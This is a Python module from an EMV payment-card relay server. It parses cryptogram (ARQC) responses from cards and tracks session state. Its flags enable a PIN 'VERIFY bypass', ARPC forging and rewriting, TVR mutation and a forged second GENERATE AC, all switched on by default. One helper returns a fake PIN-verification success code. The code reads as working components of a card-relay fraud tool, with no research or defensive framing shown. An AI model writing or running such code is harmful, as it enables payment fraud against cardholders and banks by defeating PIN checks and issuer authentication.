# -*- coding: utf-8 -*-
# emv.py

# -*- coding: utf-8 -*-

"""EMV domain: ArqcCache, SessionState, extraction, detection, helpers."""


from __future__ import annotations

from dataclasses import dataclass, field

from typing import Optional, List, Tuple

from tlv import find_tlv, build_tlv

from constants import (

    TEMPLATE_77, TEMPLATE_80, CID_NAME_MAP, CID_ARQC, CID_TC, CID_AAC,

    BRAND_UNKNOWN, brand_iad_default, SW_9000, SW_6F00,

    INS_GET_PROCESSING_OPTIONS, INS_GENERATE_AC, APDU_INS,

    detect_gpo_template, gac_p1_name,

)


import logging

log = logging.getLogger("RelayServer")


@dataclass

class ArqcCache:

    template: Optional[int] = None

    cid: Optional[int] = None

    atc: Optional[bytes] = None

    ac: Optional[bytes] = None

    iad: Optional[bytes] = None

    sdad: Optional[bytes] = None

    parse_notes: List[str] = field(default_factory=list)


    def is_complete(self) -> bool:

        return all([self.cid is not None, self.atc, self.ac, self.iad])


    def clear(self) -> None:

        self.template = None

        self.cid = None

        self.atc = None

        self.ac = None

        self.iad = None

        self.sdad = None

        self.parse_notes.clear()


@dataclass

class SessionState:

    seq: int = 0

    gpo_template: Optional[int] = None

    arqc_cache: ArqcCache = field(default_factory=ArqcCache)

    pending_capdu: Optional[bytes] = None

    pending_exchange_id: Optional[int] = None

    second_ae_pending: bool = False  # SAFE default - armed only after ARQC observation

    second_ae_reason: str = ""

    card_present: bool = False

    verify_bypass_enabled: bool = True

    arpc_forge_enabled: bool = True

    arpc_rewrite_enabled: bool = True

    tvr_mutation_enabled: bool = True

    verify_bypass_count: int = 0

    arpc_forge_count: int = 0

    arpc_rewrite_count: int = 0

    tvr_mutation_count: int = 0

    gac_response_count: int = 0

    brand: str = BRAND_UNKNOWN

    selected_aid: Optional[bytes] = None


    def reset(self) -> None:

        self.seq += 1

        self.gpo_template = None

        self.arqc_cache.clear()

        self.pending_capdu = None

        self.pending_exchange_id = None

        self.second_ae_pending = False

        self.second_ae_reason = ""

        self.card_present = False

        self.verify_bypass_count = 0

        self.arpc_forge_count = 0

        self.arpc_rewrite_count = 0

        self.tvr_mutation_count = 0

        self.gac_response_count = 0

        self.brand = BRAND_UNKNOWN

        self.selected_aid = None


def extract_arqc_from_rapdu(rapdu: bytes, gpo_template: Optional[int]) -> ArqcCache:

    cache = ArqcCache()

    if len(rapdu) < 3:

        cache.parse_notes.append("FAIL: rapdu < 3 bytes")

        return cache

    body = rapdu[:-2]

    sw = rapdu[-2:]

    cache.parse_notes.append(f"SW={sw.hex().upper()}")

    if not body:

        cache.parse_notes.append("FAIL: body empty after SW strip")

        return cache

    first = body[0]

    cache.parse_notes.append(f"first_byte=0x{first:02X}")


    if first == TEMPLATE_77:

        cache.template = TEMPLATE_77

        cache.parse_notes.append("template=77 (BER-TLV)")

        cid_val = find_tlv(body, 0x9F27)

        atc_val = find_tlv(body, 0x9F36)

        ac_val = find_tlv(body, 0x9F26)

        iad_val = find_tlv(body, 0x9F10)

        if cid_val is None:

            cache.parse_notes.append("MISS: 9F27 (CID) not found in template 77")

        elif len(cid_val) < 1:

            cache.parse_notes.append("MISS: 9F27 value empty")

        else:

            cache.cid = cid_val[0]

            cid_name = CID_NAME_MAP.get(cache.cid, f"UNKNOWN(0x{cache.cid:02X})")

            cache.parse_notes.append(f"OK: CID=0x{cache.cid:02X} {cid_name}")

        if atc_val:

            cache.atc = atc_val

            cache.parse_notes.append(f"OK: ATC={atc_val.hex().upper()}")

        else:

            cache.parse_notes.append("MISS: 9F36 (ATC) not found")

        if ac_val:

            cache.ac = ac_val

            cache.parse_notes.append(f"OK: AC={ac_val.hex().upper()}")

        else:

            cache.parse_notes.append("MISS: 9F26 (AC) not found")

        if iad_val:

            cache.iad = iad_val

            cache.parse_notes.append(f"OK: IAD={iad_val.hex().upper()}")

        else:

            cache.parse_notes.append("MISS: 9F10 (IAD) not found")


    elif first == TEMPLATE_80:

        cache.template = TEMPLATE_80

        cache.parse_notes.append("template=80 (fixed format)")

        if len(body) < 2:

            cache.parse_notes.append("FAIL: template 80 body < 2 bytes")

            return cache

        length = body[1]

        payload = body[2:2 + length]

        cache.parse_notes.append(f"declared_len={length} actual={len(payload)}")

        if len(payload) < 11:

            cache.parse_notes.append(f"FAIL: payload {len(payload)} < 11 (need CID+ATC+AC min)")

            return cache

        cache.cid = payload[0]

        cid_name = CID_NAME_MAP.get(cache.cid, f"UNKNOWN(0x{cache.cid:02X})")

        cache.parse_notes.append(f"OK: CID=0x{cache.cid:02X} {cid_name}")

        cache.atc = payload[1:3]

        cache.parse_notes.append(f"OK: ATC={cache.atc.hex().upper()}")

        cache.ac = payload[3:11]

        cache.parse_notes.append(f"OK: AC={cache.ac.hex().upper()}")

        cache.iad = payload[11:] if len(payload) > 11 else b""

        cache.parse_notes.append(

            f"OK: IAD={cache.iad.hex().upper()}" if cache.iad

            else "WARN: IAD empty (payload had no bytes after AC)"

        )


    else:

        cache.parse_notes.append(f"FAIL: unrecognized template 0x{first:02X}")

        if gpo_template in (TEMPLATE_77, TEMPLATE_80):

            cache.template = gpo_template

            cache.parse_notes.append(f"FALLBACK: inheriting GPO template 0x{gpo_template:02X}")


    return cache


def cid_indicates_arqc(cache: ArqcCache, rapdu: bytes) -> Tuple[bool, str]:

    if cache.cid is not None:

        if cache.cid == CID_ARQC:

            return True, "CID=0x80 ARQC parsed cleanly"

        if cache.cid == CID_TC:

            return False, "CID=0x40 TC (card offline-approved, no 2nd GAC expected)"

        if cache.cid == CID_AAC:

            return False, "CID=0x00 AAC (card offline-declined, no 2nd GAC will follow)"

        return False, f"CID=0x{cache.cid:02X} unrecognized (not ARQC)"


    if b"\x9F\x27\x01\x80" in rapdu:

        return True, "byte-scan fallback matched 9F 27 01 80"

    if b"\x9F\x27\x01\x40" in rapdu:

        return False, "byte-scan fallback matched 9F 27 01 40 (TC)"

    if b"\x9F\x27\x01\x00" in rapdu:

        return False, "byte-scan fallback matched 9F 27 01 00 (AAC)"

    return False, "CID unparseable AND no byte-scan hit - state machine cannot arm 2nd GAC forge"


def craft_verify_success_bytes() -> bytes:

    """Return SW=9000 for VERIFY bypass."""

    try:

        from protocol import craft_verify_success

        resp = craft_verify_success()

        if hasattr(resp, "to_bytes"):

            return resp.to_bytes()

        if hasattr(resp, "__bytes__"):

            return bytes(resp)

        if hasattr(resp, "raw"):

            return resp.raw

    except Exception:

        pass

    return SW_9000


def fix_gac_response_length(payload: bytes) -> Tuple[bytes, Optional[str]]:

    """Correct TLV length field in GAC response if mismatched."""

    if len(payload) < 4:

        return payload, None


    body = payload[:-2]

    sw = payload[-2:]

    if not body:

        return payload, None


    first = body[0]

    if first not in (TEMPLATE_77, TEMPLATE_80):

        return payload, None


    if len(body) < 2:

        return payload, None


    length_first = body[1]

    if length_first < 0x80:

        declared_len = length_first

        header_size = 2

    elif length_first == 0x81:

        if len(body) < 3:

            return payload, None

        declared_len = body[2]

        header_size = 3

    elif length_first == 0x82:

        if len(body) < 4:

            return payload, None

        declared_len = (body[2] << 8) | body[3]

        header_size = 4

    else:

        return payload, None


    actual_len = len(body) - header_size

    if actual_len == declared_len:

        return payload, None


    inner = body[header_size:]

    tag = bytes([first])


    if actual_len < 0x80:

        new_length_bytes = bytes([actual_len])

    elif actual_len < 0x100:

        new_length_bytes = bytes([0x81, actual_len])

    else:

        new_length_bytes = bytes([0x82, (actual_len >> 8) & 0xFF, actual_len & 0xFF])


    fixed = tag + new_length_bytes + inner + sw

    note = (f"template=0x{first:02X} declared_len={declared_len} "

            f"actual_len={actual_len} -> length byte rewritten")

    return fixed, note